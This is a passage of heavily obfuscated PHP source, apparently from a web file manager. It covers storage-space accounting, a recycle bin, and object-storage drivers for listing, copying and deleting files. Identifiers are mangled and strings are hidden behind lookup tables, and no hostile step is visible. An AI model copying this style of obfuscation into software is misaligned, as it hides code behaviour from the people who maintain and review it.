$this->targetSpaceSize($‹š€ìÓò, $§ï¾çú¯); if ($‹š€ìÓò == self::TYPE_USER) { Model($ú…ùø˜[542])->userEdit($§ï¾çú¯, array($ú…ùø˜[1840] => $ªùÁÚæû)); } else { if ($‹š€ìÓò == self::TYPE_GROUP) { Model($ú…ùø˜[550])->groupEdit($§ï¾çú¯, array($ú…ùø˜[1840] => $ªùÁÚæû)); } } } public function targetSpaceSize($–ŠÄøÏ, $¹¿¯é»®) { $…Ê°ïÜ =& $_SERVER[¡“ËÌ§œ]; $ÔàÎÕ¨ì = 0; $¾õ¼Âé‚ = $this->targetSourceRoot($–ŠÄøÏ, $¹¿¯é»®, !0); foreach ($¾õ¼Âé‚ as $Ìı¸´Ì°) { if (!$Ìı¸´Ì°) { continue; } $ÔàÎÕ¨ì += floatval($Ìı¸´Ì°[$…Ê°ïÜ[76]]); $à­˜å† = array($…Ê°ïÜ[618] => array($…Ê°ïÜ[578], $…Ê°ïÜ[559] . $Ìı¸´Ì°[$…Ê°ïÜ[440]] . $…Ê°ïÜ[579])); $Ï¤Ø¡İ« = Model($…Ê°ïÜ[467])->field($…Ê°ïÜ[455])->where($à­˜å†)->select(); $Ï¤Ø¡İ« = array_to_keyvalue($Ï¤Ø¡İ«, $…Ê°ïÜ[12], $…Ê°ïÜ[440]); $Ï¤Ø¡İ« = array_unique(array_filter($Ï¤Ø¡İ«)); if ($Ï¤Ø¡İ«) { $à­˜å† = array($…Ê°ïÜ[455] => array($…Ê°ïÜ[456], $Ï¤Ø¡İ«)); $ÔàÎÕ¨ì += floatval($this->where($à­˜å†)->sum($…Ê°ïÜ[76])); } } $ÔàÎÕ¨ì = !$ÔàÎÕ¨ì || $ÔàÎÕ¨ì <= 0 ? 0 : $ÔàÎÕ¨ì; return $ÔàÎÕ¨ì; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¹æØ‹‰í) { return $this->fileTypeProfile($¹æØ‹‰í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($åõå¿åÍ) { return $this->fileTypeProfile($åõå¿åÍ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ë„íãŒ°, $ŠÇùıÀ) { $¬ó¢šÆ =& $_SERVER[¡“ËÌ§œ]; $«êÂàÁô = $¬ó¢šÆ[2161] . $ë„íãŒ° . $¬ó¢šÆ[11] . $ŠÇùıÀ; $Äè’¸Óø = Cache::get($«êÂàÁô); if ($Äè’¸Óø) { return $Äè’¸Óø; } $¥Ş³¶ƒ¿ = array($¬ó¢šÆ[612] => 0); if ($ë„íãŒ° != !1) { $¥Ş³¶ƒ¿[$¬ó¢šÆ[534]] = $ë„íãŒ°; $¥Ş³¶ƒ¿[$¬ó¢šÆ[449]] = $ŠÇùıÀ; } $¯Œ¦³÷ = array(); $¯Œ¦³÷[$¬ó¢šÆ[2162]] = array($¬ó¢šÆ[2163] => LNG($¬ó¢šÆ[2162]), $¬ó¢šÆ[2164] => $this->where($¥Ş³¶ƒ¿)->count(), $¬ó¢šÆ[583] => $this->where($¥Ş³¶ƒ¿)->sum($¬ó¢šÆ[76])); $§¤È”„ = KodIO::fileTypeList(); foreach ($§¤È”„ as $Ö‹«ª†¬ => $‡ó¥ÉÏç) { $¥Ş³¶ƒ¿[$¬ó¢šÆ[450]] = $this->fileTypeWhere($Ö‹«ª†¬); $¯Œ¦³÷[$Ö‹«ª†¬] = array($¬ó¢šÆ[2163] => $‡ó¥ÉÏç[$¬ó¢šÆ[32]], $¬ó¢šÆ[2164] => $this->where($¥Ş³¶ƒ¿)->count(), $¬ó¢šÆ[583] => $this->where($¥Ş³¶ƒ¿)->sum($¬ó¢šÆ[76])); } Cache::set($«êÂàÁô, $¯Œ¦³÷, 1200); return $¯Œ¦³÷; } public function fileNameExist($µÀÒ½ÍÛ, $—¥¯ä‹) { $ğ²Ñ˜•Ê =& $_SERVER[¡“ËÌ§œ]; $€øåùâø = $this->where(array($ğ²Ñ˜•Ê[470] => $µÀÒ½ÍÛ, $ğ²Ñ˜•Ê[32] => $—¥¯ä‹, $ğ²Ñ˜•Ê[469] => 0))->find(); return is_array($€øåùâø) ? $€øåùâø[$ğ²Ñ˜•Ê[440]] : !1; } public function childList($˜…ğ—‰¢) { $‹ƒåüÈû =& $_SERVER[¡“ËÌ§œ]; $‰ç÷ÒËğ = $‹ƒåüÈû[2138] . $˜…ğ—‰¢; if (isset(self::$cacheChildList[$‰ç÷ÒËğ])) { return self::$cacheChildList[$‰ç÷ÒËğ]; } $Á¿Ì¼Íê = array($‹ƒåüÈû[470] => intval($˜…ğ—‰¢), $‹ƒåüÈû[469] => 0); $ü–ñ‘Íé = $this->where($Á¿Ì¼Íê)->select(); $ü–ñ‘Íé = $ü–ñ‘Íé ? $ü–ñ‘Íé : array(); self::$cacheChildList[$‰ç÷ÒËğ] = $ü–ñ‘Íé; foreach ($ü–ñ‘Íé as $­Á»‚‡) { $‰ç÷ÒËğ = $‹ƒåüÈû[498] . $­Á»‚‡[$‹ƒåüÈû[440]]; self::$cacheSourceInfo[$‰ç÷ÒËğ] = $­Á»‚‡; } return $ü–ñ‘Íé; } public function fileNameAuto($¼©·®˜Š, $Ô•õ€Ÿ½, $É£°õ·û = REPEAT_RENAME, $›ÜÚŸß® = false) { $ì¹ÑàÁ =& $_SERVER[¡“ËÌ§œ]; $ÜÛ»ÒÛ = get_path_ext($Ô•õ€Ÿ½); $‹¾¡»§£ = $ÜÛ»ÒÛ ? basename($Ô•õ€Ÿ½, $ì¹ÑàÁ[10] . $ÜÛ»ÒÛ) . $ì¹ÑàÁ[2165] . $ÜÛ»ÒÛ : $Ô•õ€Ÿ½ . $ì¹ÑàÁ[413]; $šû—‰‡¨ = array($ì¹ÑàÁ[470] => $¼©·®˜Š, $ì¹ÑàÁ[469] => 0, $ì¹ÑàÁ[32] => array($ì¹ÑàÁ[412], $‹¾¡»§£)); $†‚ şÛÕ = $this->field($ì¹ÑàÁ[32])->where($šû—‰‡¨)->select(); $ÆÎ“»î¾ = array_to_keyvalue($†‚ şÛÕ, $ì¹ÑàÁ[12], $ì¹ÑàÁ[32]); return $this->fileNameAutoGet($ÆÎ“»î¾, $Ô•õ€Ÿ½, $É£°õ·û, $›ÜÚŸß®); } public function fileNameAutoGet($²¤ùô, $¿ûôÒ´Ç, $¨ùÖô‘ó, $šäµŒàó) { $¹Œ‚³×© =& $_SERVER[¡“ËÌ§œ]; if ($¨ùÖô‘ó == REPEAT_REPLACE || !$²¤ùô || !in_array_not_case($¿ûôÒ´Ç, $²¤ùô) || $šäµŒàó && $¨ùÖô‘ó != REPEAT_RENAME_FOLDER) { return $¿ûôÒ´Ç; } if ($¨ùÖô‘ó == REPEAT_SKIP) { return !1; } $Ò±çâ±ï = $¹Œ‚³×©[10] . get_path_ext($¿ûôÒ´Ç); $Ò±çâ±ï = $Ò±çâ±ï == $¹Œ‚³×©[10] || $šäµŒàó ? $¹Œ‚³×©[12] : $Ò±çâ±ï; for ($²Ê¨œ ’ = 1; $²Ê¨œ ’ <= count($²¤ùô) + 1; $²Ê¨œ ’++) { $¯åĞË™ = substr($¿ûôÒ´Ç, 0, strlen($¿ûôÒ´Ç) - strlen($Ò±çâ±ï)); $ŒÃ¦€ˆú = $¯åĞË™ . "\50{$²Ê¨œ ’}\x29{$Ò±çâ±ï}"; if (!in_array_not_case($ŒÃ¦€ˆú, $²¤ùô)) { return $ŒÃ¦€ˆú; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\145\x5f\x72\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\151\x6f\x6e")); public function listData($ÇËúÈã = false) { $şëéç· =& $_SERVER[¡“ËÌ§œ]; $ÇËúÈã = $ÇËúÈã ? $ÇËúÈã : USER_ID; $¥†Å¤Ö– = $this->where(array($şëéç·[1652] => $ÇËúÈã))->select(); return array_to_keyvalue($¥†Å¤Ö–, $şëéç·[12], $şëéç·[440]); } public function moveToRecycle($€·áãÜ) { $ˆÚ…×ïÓ =& $_SERVER[¡“ËÌ§œ]; $–ç×åèŸ = Model($ˆÚ…×ïÓ[1353]); $¨ËØà³š = $–ç×åèŸ->sourceInfo($€·áãÜ); if (!$¨ËØà³š || $¨ËØà³š[$ˆÚ…×ïÓ[469]] == $ˆÚ…×ïÓ[88]) { return; } $«Ü¶İ† = array($ˆÚ…×ïÓ[455] => $€·áãÜ, $ˆÚ…×ïÓ[1652] => USER_ID, $ˆÚ…×ïÓ[614] => $¨ËØà³š[$ˆÚ…×ïÓ[449]], $ˆÚ…×ïÓ[615] => $¨ËØà³š[$ˆÚ…×ïÓ[534]], $ˆÚ…×ïÓ[618] => $¨ËØà³š[$ˆÚ…×ïÓ[549]]); $this->add($«Ü¶İ†); $this->recycleMove($€·áãÜ, 1); if ($¨ËØà³š[$ˆÚ…×ïÓ[448]] == $ˆÚ…×ïÓ[88]) { $Ó¨Œ²º˜ = array($ˆÚ…×ïÓ[618] => array($ˆÚ…×ïÓ[578], $¨ËØà³š[$ˆÚ…×ïÓ[549]] . $€·áãÜ . $ˆÚ…×ïÓ[579])); $–ç×åèŸ->where($Ó¨Œ²º˜)->setField($ˆÚ…×ïÓ[469], 1); } } public function clear() { $this->remove(!1); } public function remove($ß¸Üåà = false, $Ã¶³Ú¥÷ = false) { $¥ŠÇ¥Î =& $_SERVER[¡“ËÌ§œ]; $Ã¶³Ú¥÷ = $Ã¶³Ú¥÷ ? $Ã¶³Ú¥÷ : USER_ID; $®åÕÅå = Model($¥ŠÇ¥Î[1353]); $Ø«Îİ´¡ = $this->listData($Ã¶³Ú¥÷); $ß¸Üåà = $ß¸Üåà === !1 ? !1 : $ß¸Üåà; $•‰ÛöÎ = array(); foreach ($Ø«Îİ´¡ as $•»éò) { if ($ß¸Üåà != !1 && !in_array($•»éò, $ß¸Üåà)) { continue; } $ûğ‹éÇµ = $®åÕÅå->sourceInfo($•»éò); $®åÕÅå->remove($•»éò, !1); $˜öË‡ › = $ûğ‹éÇµ[$¥ŠÇ¥Î[449]] . $¥ŠÇ¥Î[11] . $ûğ‹éÇµ[$¥ŠÇ¥Î[534]]; $•‰ÛöÎ[$˜öË‡ ›] = array($¥ŠÇ¥Î[614] => $ûğ‹éÇµ[$¥ŠÇ¥Î[449]], $¥ŠÇ¥Î[534] => $ûğ‹éÇµ[$¥ŠÇ¥Î[534]]); $this->where(array($¥ŠÇ¥Î[440] => $•»éò))->delete(); } foreach ($•‰ÛöÎ as $¡°Ù‡) { $®åÕÅå->targetSpaceUpdate($¡°Ù‡[$¥ŠÇ¥Î[449]], $¡°Ù‡[$¥ŠÇ¥Î[534]]); } } public function restore($°…ŞÃê = false) { $İ£±µ­– = $this->listData(); $this->_restoreSource($İ£±µ­–, $°…ŞÃê); } public function removeUserAll($ÙÛÊÂ‡ã) { $this->remove(!1, $ÙÛÊÂ‡ã); } private function _restoreSource($èÕú©¼·, $Ïçù…Ì”) { $–ğ§İò‰ =& $_SERVER[¡“ËÌ§œ]; $ºÏâ¥¬Š = Model($–ğ§İò‰[1353]); $Ïçù…Ì” = $Ïçù…Ì” == !1 ? !1 : $Ïçù…Ì”; if (!$èÕú©¼·) { return !0; } $ŒÊ’Äùâ = array(); foreach ($èÕú©¼· as $ò‡³ß¿ê) { if ($Ïçù…Ì” != !1 && !in_array($ò‡³ß¿ê, $Ïçù…Ì”)) { continue; } $íâé›¾í = $ºÏâ¥¬Š->sourceInfo($ò‡³ß¿ê); $§˜ş÷ÛÄ = $ºÏâ¥¬Š->sourceInfo($íâé›¾í[$–ğ§İò‰[470]]); if ($§˜ş÷ÛÄ[$–ğ§İò‰[469]] == $–ğ§İò‰[88]) { continue; } $ºÏâ¥¬Š->lockMoveStart($ò‡³ß¿ê); $this->recycleMove($ò‡³ß¿ê, 0); if ($íâé›¾í[$–ğ§İò‰[448]] == $–ğ§İò‰[88]) { $¾¹ÒÜùü = array($–ğ§İò‰[618] => array($–ğ§İò‰[578], $íâé›¾í[$–ğ§İò‰[549]] . $ò‡³ß¿ê . $–ğ§İò‰[579])); $ºÏâ¥¬Š->where($¾¹ÒÜùü)->setField($–ğ§İò‰[469], 0); $this->restoreFolderChildren($ò‡³ß¿ê, $èÕú©¼·); } $this->where(array($–ğ§İò‰[440] => $ò‡³ß¿ê))->delete(); $ºÏâ¥¬Š->folderSizeReset($íâé›¾í[$–ğ§İò‰[470]]); $ŒÊ’Äùâ[] = $íâé›¾í[$–ğ§İò‰[470]]; if ($íâé›¾í[$–ğ§İò‰[448]] == $–ğ§İò‰[88]) { $ŒÊ’Äùâ[] = $ò‡³ß¿ê; } $ºÏâ¥¬Š->lockMoveEnd($ò‡³ß¿ê); } $ºÏâ¥¬Š->updateModifyTime($ŒÊ’Äùâ); } private function restoreFolderChildren($–è¾×…ª, $Ò“œ´ö) { $à•è×òó =& $_SERVER[¡“ËÌ§œ]; $ã™áç€» = Model($à•è×òó[1353]); $—­š’‚ß = array($à•è×òó[440] => array($à•è×òó[7], array())); foreach ($Ò“œ´ö as $÷Ôê¦Ï«) { if ($÷Ôê¦Ï« == $–è¾×…ª) { continue; } if (!$ã™áç€»->isParentOf($–è¾×…ª, $÷Ôê¦Ï«)) { continue; } $¬”½ŒÜİ = $ã™áç€»->sourceInfo($÷Ôê¦Ï«); if ($¬”½ŒÜİ[$à•è×òó[448]] == $à•è×òó[88]) { $—­š’‚ß[] = array($à•è×òó[618] => array($à•è×òó[578], $¬”½ŒÜİ[$à•è×òó[549]] . $÷Ôê¦Ï« . $à•è×òó[579])); } else { $—­š’‚ß[$à•è×òó[440]][1][] = $÷Ôê¦Ï«; } } if (!$—­š’‚ß[$à•è×òó[440]][1]) { unset($—­š’‚ß[$à•è×òó[440]]); } if (!$—­š’‚ß) { return; } if (is_array($—­š’‚ß[$à•è×òó[440]]) && is_array($—­š’‚ß[$à•è×òó[440]][1])) { $—­š’‚ß[$à•è×òó[440]][1] = array_unique($—­š’‚ß[$à•è×òó[440]][1]); } $—­š’‚ß[$à•è×òó[1020]] = $à•è×òó[1949]; $ã™áç€»->where($—­š’‚ß)->setField($à•è×òó[469], 1); } private function recycleMove($ÁÁâ¼¦©, $ôâ¢°œ = 1) { $€«Ëôğ¥ =& $_SERVER[¡“ËÌ§œ]; $æ£Ïéù¤ = Model($€«Ëôğ¥[1353]); $‰ü·ŞºÍ = Model($€«Ëôğ¥[2166]); $²¦–¹›ô = array($€«Ëôğ¥[440] => $ÁÁâ¼¦©); if ($ôâ¢°œ) { $æ£Ïéù¤->where($²¦–¹›ô)->setField($€«Ëôğ¥[469], 1); $‰ü·ŞºÍ->eventRecycle($ÁÁâ¼¦©, $€«Ëôğ¥[2167]); } else { $¯ÔÖšÚŸ = $æ£Ïéù¤->where($²¦–¹›ô)->find(); $ÔêºØÚà = $¯ÔÖšÚŸ[$€«Ëôğ¥[448]] == $€«Ëôğ¥[88]; $§ÂÒ´¦Ç = $æ£Ïéù¤->fileNameAuto($¯ÔÖšÚŸ[$€«Ëôğ¥[470]], $¯ÔÖšÚŸ[$€«Ëôğ¥[32]], REPEAT_RENAME_FOLDER, $ÔêºØÚà); if ($§ÂÒ´¦Ç != $¯ÔÖšÚŸ[$€«Ëôğ¥[32]]) { $æ£Ïéù¤->rename($ÁÁâ¼¦©, $§ÂÒ´¦Ç); } $æ£Ïéù¤->where($²¦–¹›ô)->setField($€«Ëôğ¥[469], 0); $‰ü·ŞºÍ->eventRecycle($ÁÁâ¼¦©, $€«Ëôğ¥[2168]); } } } goto AÑÜò“Ş—ß; Cã»ÒÉ¹Ê‡: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($®ƒäùÑ¯) { parent::__construct($®ƒäùÑ¯); $this->signatureVersion($_SERVER[¡“ËÌ§œ][216]); } public function fileOutLink($°üÀÒ¤›) { $Ü°±‡Â =& $_SERVER[¡“ËÌ§œ]; if (substr($°üÀÒ¤›, 0, 7) == $Ü°±‡Â[1351]) { $°üÀÒ¤› = $Ü°±‡Â[1352] . substr($°üÀÒ¤›, 7); } header($Ü°±‡Â[161] . $°üÀÒ¤›); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ËĞıßæ¸) { parent::__construct(); include_once SDK_DIR . $_SERVER[¡“ËÌ§œ][1388]; $this->_init($ËĞıßæ¸); } public function _init($§†ùá™) { $¯«£üîÍ =& $_SERVER[¡“ËÌ§œ]; $this->config = $§†ùá™; foreach ($§†ùá™ as $íâ¤™©Ú => $ñşƒÂ†ò) { if (isset($this->{$íâ¤™©Ú})) { $this->{$íâ¤™©Ú} = $ñşƒÂ†ò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¯«£üîÍ[1389] . LNG($¯«£üîÍ[1390])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ãÒ“ª˜¼ =& $_SERVER[¡“ËÌ§œ]; $»¯Üå« = new OSS\Model\CorsConfig(); $†°šûĞó = new OSS\Model\CorsRule(); $†°šûĞó->addAllowedOrigin($ãÒ“ª˜¼[1391]); $†°šûĞó->addAllowedMethod($ãÒ“ª˜¼[1392]); $†°šûĞó->addAllowedMethod($ãÒ“ª˜¼[1393]); $†°šûĞó->addAllowedMethod($ãÒ“ª˜¼[1394]); $†°šûĞó->addAllowedMethod($ãÒ“ª˜¼[1395]); $†°šûĞó->addAllowedMethod($ãÒ“ª˜¼[160]); $†°šûĞó->setMaxAgeSeconds(600); $†°šûĞó->addExposeHeader($ãÒ“ª˜¼[1396]); $†°šûĞó->addAllowedHeader($ãÒ“ª˜¼[1391]); $»¯Üå«->addRule($†°šûĞó); try { $this->client->putBucketCors($this->bucket, $»¯Üå«); } catch (OSS\Core\OssException $ğ×´ßĞ‚) { return !1; } return !0; } public function getBucketCors() { $õÑ¶áó× =& $_SERVER[¡“ËÌ§œ]; $×ßùäİµ = null; try { $×ßùäİµ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ƒíÎÛÎÚ) { return null; } if (!$×ßùäİµ || !($¶ë˜›ß = $×ßùäİµ->getRules())) { return null; } $¥é¥ Áµ = $¶ë˜›ß[0]->getAllowedOrigins(); $ôÅŸÖƒÏ = $¶ë˜›ß[0]->getAllowedMethods(); $÷îÈ„‘¢ = $¶ë˜›ß[0]->getMaxAgeSeconds(); $ë¾Ê¨í‡ = $¶ë˜›ß[0]->getExposeHeaders(); $šé­óÜ– = $¶ë˜›ß[0]->getAllowedHeaders(); return array($õÑ¶áó×[188] => isset($¥é¥ Áµ[0]) ? $¥é¥ Áµ[0] : $õÑ¶áó×[12], $õÑ¶áó×[192] => $ôÅŸÖƒÏ, $õÑ¶áó×[1397] => $÷îÈ„‘¢, $õÑ¶áó×[1398] => isset($ë¾Ê¨í‡[0]) ? $ë¾Ê¨í‡[0] : $õÑ¶áó×[12], $õÑ¶áó×[190] => isset($šé­óÜ–[0]) ? $šé­óÜ–[0] : $õÑ¶áó×[12]); } public function isBucketCors() { $ŠÕ¯˜Œš =& $_SERVER[¡“ËÌ§œ]; $éÚ— = $this->getBucketCors(); if (!$éÚ— || !is_array($éÚ—)) { return !1; } if ($éÚ—[$ŠÕ¯˜Œš[188]] != $ŠÕ¯˜Œš[189] || $éÚ—[$ŠÕ¯˜Œš[190]] != $ŠÕ¯˜Œš[189]) { return !1; } $Ù¬ëê„ = array_map($ŠÕ¯˜Œš[191], $éÚ—[$ŠÕ¯˜Œš[192]]); if (!is_array($Ù¬ëê„)) { $Ù¬ëê„ = array(); } $ÂÓªÙÛ² = array($ŠÕ¯˜Œš[193], $ŠÕ¯˜Œš[194], $ŠÕ¯˜Œš[195], $ŠÕ¯˜Œš[196], $ŠÕ¯˜Œš[197]); $ÅªŸŸ§û = array_diff($ÂÓªÙÛ², $Ù¬ëê„); return empty($ÅªŸŸ§û); } public function mkfile($¿çµòíË, $åí‡Ù×Ä = '', $¨æå×‹¿ = REPEAT_RENAME) { $¤ˆö¨º¡ = $this->setContent($¿çµòíË, $åí‡Ù×Ä); if ($¤ˆö¨º¡ !== !1) { return $this->getPathOuter($¿çµòíË); } return !1; } public function mkdir($ñŒËš, $…¦´¸Ç = REPEAT_SKIP) { if ($…¦´¸Ç && $this->_isFolder($ñŒËš)) { return $this->getPathOuter($ñŒËš); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ñŒËš)); } catch (OSS\Core\OssException $âà½ïì) { return !1; } return $this->getPathOuter($ñŒËš); } private function fileList($•á©’©, $‰²ùõ·Ï = '', $›ó–Ó•‘ = 0) { $¶¤÷Êñ’ =& $_SERVER[¡“ËÌ§œ]; $•á©’© = trim($•á©’©, $¶¤÷Êñ’[8]); $’æ·óÚï = empty($•á©’©) && $•á©’© !== $¶¤÷Êñ’[198] ? $¶¤÷Êñ’[12] : $•á©’© . $¶¤÷Êñ’[8]; $ÆÙ”°Î“ = $¶¤÷Êñ’[12]; $µú»×°· = 1000; $ƒëşÃ = $¥ŠÃÜ¿ = array(); while (!0) { check_abort(); $Ó“×¦‚À = array($¶¤÷Êñ’[1399] => $‰²ùõ·Ï, $¶¤÷Êñ’[1400] => $’æ·óÚï, $¶¤÷Êñ’[1401] => $µú»×°·, $¶¤÷Êñ’[1402] => $ÆÙ”°Î“); try { $—ØÏÏï‰ = $this->client->listObjects($this->bucket, $Ó“×¦‚À); } catch (OSS\Core\OssException $øä«¸÷) { break; } $ÆÙ”°Î“ = $—ØÏÏï‰->getNextMarker(); $ô—»»êò = $—ØÏÏï‰->getObjectList(); $ôÜ¿ë¥Š = $—ØÏÏï‰->getPrefixList(); foreach ($ô—»»êò as $‡öÂÍœ‹) { if ($‡öÂÍœ‹->getKey() == $’æ·óÚï) { continue; } $¤Ò—ı = $‡öÂÍœ‹->getKey(); $òÙªœÁ‡ = $‡öÂÍœ‹->getSize(); $ÌÏ˜´Óå = $‡öÂÍœ‹->getLastModified(); $–ï¹×÷„ = $›ó–Ó•‘ ? array($¶¤÷Êñ’[32] => $¤Ò—ı, $¶¤÷Êñ’[76] => $òÙªœÁ‡, $¶¤÷Êñ’[180] => strtotime($ÌÏ˜´Óå)) : $¤Ò—ı; $†¥¬ÔÙ¯ = $òÙªœÁ‡ == 0 && substr($¤Ò—ı, strlen($¤Ò—ı) - 1, 1) == $¶¤÷Êñ’[8] ? !0 : !1; $ÒÂÅû‡û = array($¶¤÷Êñ’[76] => $òÙªœÁ‡, $¶¤÷Êñ’[1403] => $òÙªœÁ‡, $¶¤÷Êñ’[85] => strtotime($ÌÏ˜´Óå), $¶¤÷Êñ’[1404] => $ÌÏ˜´Óå); $this->cacheMethodInfoSet($¤Ò—ı, $†¥¬ÔÙ¯, $ÒÂÅû‡û); if ($†¥¬ÔÙ¯) { $ƒëşÃ[] = $¤Ò—ı; continue; } $¥ŠÃÜ¿[] = $–ï¹×÷„; } foreach ($ôÜ¿ë¥Š as $ô”‡×ÈÖ) { $ƒëşÃ[] = $ô”‡×ÈÖ->getPrefix(); $this->cacheMethodInfoSet($ô”‡×ÈÖ->getPrefix(), !0); } if ($ÆÙ”°Î“ === $¶¤÷Êñ’[12]) { break; } } $this->cacheMethodInfoSet($•á©’©, !0); return array($¶¤÷Êñ’[82] => $ƒëşÃ, $¶¤÷Êñ’[83] => $¥ŠÃÜ¿); } public function copyFile($ù§†³­, $ÖÑ™”ñ¨) { $‘üü®¦î = $this->size($ù§†³­); if ($‘üü®¦î < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ù§†³­, $this->bucket, $this->pathEncode($ÖÑ™”ñ¨)); } catch (OSS\Core\OssException $ƒï«­Ùä) { return !1; } return $this->getPathOuter($ÖÑ™”ñ¨); } $ËÈÅñãü = $this->multiCopyObject($ù§†³­, $ÖÑ™”ñ¨, $‘üü®¦î); return $ËÈÅñãü ? $this->getPathOuter($ÖÑ™”ñ¨) : !1; } private function multiCopyObject($ÓÓ¢ŸËµ, $µÏ¦Ş, $²Ü¥ªÛê) { $íıÃ¸ì =& $_SERVER[¡“ËÌ§œ]; try { $£ó¤á† = array(); if ($Î€ãáÖÔ = $this->hashMd5($ÓÓ¢ŸËµ)) { $£ó¤á† = array(OSS\OssClient::OSS_HEADERS => array($íıÃ¸ì[1405] => $Î€ãáÖÔ)); } $ÙçÎ—Ù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($µÏ¦Ş), $£ó¤á†); $•»ı©“Õ = 1; $ï©ÍÜğ¾ = 0; $Ñøé±‡™ = array(); $‡˜¤íü = 1024 * 1024 * 10; $³Æ®äÈ = $this->client->generateMultiuploadParts($²Ü¥ªÛê, $‡˜¤íü); foreach ($³Æ®äÈ as $‰€¾ÇÂ¯ => $ªœ™Şó¿) { $™´ç•æú = $ï©ÍÜğ¾ + (int) $ªœ™Şó¿[$íıÃ¸ì[1406]]; $Â³ĞÇ…¯ = (int) $ªœ™Şó¿[$íıÃ¸ì[366]] + $™´ç•æú - 1; $¥º¡ÒÑÅ = array($íıÃ¸ì[1407] => $™´ç•æú, $íıÃ¸ì[1408] => $Â³ĞÇ…¯); $Ñøé±‡™[] = $this->client->uploadPartCopy($this->bucket, $ÓÓ¢ŸËµ, $this->bucket, $this->pathEncode($µÏ¦Ş), $•»ı©“Õ, $ÙçÎ—Ù, $¥º¡ÒÑÅ); $•»ı©“Õ = $•»ı©“Õ + 1; } $ç«Ê»‰Î = array(); foreach ($Ñøé±‡™ as $‰€¾ÇÂ¯ => $ëé®Œê§) { $ç«Ê»‰Î[] = array($íıÃ¸ì[1409] => $‰€¾ÇÂ¯ + 1, $íıÃ¸ì[1410] => $ëé®Œê§); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($µÏ¦Ş), $ÙçÎ—Ù, $ç«Ê»‰Î); } catch (OSS\Core\OssException $²ı­£—ê) { return !1; } return !0; } public function moveFile($›¿ñëêù, $ú·œã‚) { if ($this->copyFile($›¿ñëêù, $ú·œã‚)) { $this->remove($›¿ñëêù); return $this->getPathOuter($ú·œã‚); } return !1; } public function delFile($Òä§Ì¦) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Òä§Ì¦)); } catch (OSS\Core\OssException $À¶³ºÀš) { return !1; } return !0; } public function delFolder($ÈÔŒúô) { $²ø¹Ò«“ =& $_SERVER[¡“ËÌ§œ]; if (!$this->exist($ÈÔŒúô)) { return !0; } $this->listItemCache = !1; $Õší—¥ = $this->fileList($ÈÔŒúô); $this->listItemCache = !0; $Å¹Ëéæ¢ = trim($ÈÔŒúô, $²ø¹Ò«“[8]) . $²ø¹Ò«“[8]; if (!empty($ÈÔŒúô) && $ÈÔŒúô !== $²ø¹Ò«“[198] && !in_array($Å¹Ëéæ¢, $Õší—¥[$²ø¹Ò«“[82]])) { $Õší—¥[$²ø¹Ò«“[82]][] = $Å¹Ëéæ¢; } $„®½­ßÍ = $this->delByBatch($Õší—¥[$²ø¹Ò«“[83]]); if (!$„®½­ßÍ) { return !1; } $„®½­ßÍ = $this->delByBatch($Õší—¥[$²ø¹Ò«“[82]]); if (!$„®½­ßÍ) { return !1; } return $this->delFile($Å¹Ëéæ¢); } private function delByBatch($·áø¸) { foreach (array_chunk($·áø¸, 1000) as $­Êò²ı•) { try { $this->client->deleteObjects($this->bucket, $­Êò²ı•); } catch (OSS\Core\OssException $ØÆìÌÖ) { return !1; } } return !0; } public function rename($¸íÚöÒ, $•õ˜ë) { return $this->renameObject($¸íÚöÒ, $•õ˜ë); } private function fileInfo($¢ƒÍ‡äĞ, $”Óà¡ºë = false, $ƒÃÃÙ†Ÿ = array()) { $ñùÜù…µ =& $_SERVER[¡“ËÌ§œ]; $ÃÈÉÊú‚ = array($ñùÜù…µ[32] => $this->pathThis($¢ƒÍ‡äĞ), $ñùÜù…µ[84] => $this->getPathOuter($¢ƒÍ‡äĞ), $ñùÜù…µ[33] => $ñùÜù…µ[200], $ñùÜù…µ[76] => isset($ƒÃÃÙ†Ÿ[$ñùÜù…µ[76]]) ? $ƒÃÃÙ†Ÿ[$ñùÜù…µ[76]] : 0, $ñùÜù…µ[174] => $this->ext($¢ƒÍ‡äĞ)); if ($”Óà¡ºë) { return $ÃÈÉÊú‚; } $ÃÈÉÊú‚[$ñùÜù…µ[201]] = $ÃÈÉÊú‚[$ñùÜù…µ[85]] = 0; $ÃÈÉÊú‚[$ñùÜù…µ[202]] = $ÃÈÉÊú‚[$ñùÜù…µ[203]] = !0; if (empty($ƒÃÃÙ†Ÿ)) { $–Ø—•Ä… = $this->objectMeta($¢ƒÍ‡äĞ); if (!$–Ø—•Ä…) { return $ÃÈÉÊú‚; } $ƒÃÃÙ†Ÿ = array($ñùÜù…µ[85] => strtotime($–Ø—•Ä…[$ñùÜù…µ[1404]]), $ñùÜù…µ[76] => $–Ø—•Ä…[$ñùÜù…µ[1403]] + 0); } if (isset($ƒÃÃÙ†Ÿ[$ñùÜù…µ[76]])) { $ÃÈÉÊú‚[$ñùÜù…µ[76]] = $ƒÃÃÙ†Ÿ[$ñùÜù…µ[76]]; } if (isset($ƒÃÃÙ†Ÿ[$ñùÜù…µ[85]])) { $ÃÈÉÊú‚[$ñùÜù…µ[85]] = $ƒÃÃÙ†Ÿ[$ñùÜù…µ[85]]; } if (isset($ƒÃÃÙ†Ÿ[$ñùÜù…µ[180]]) && 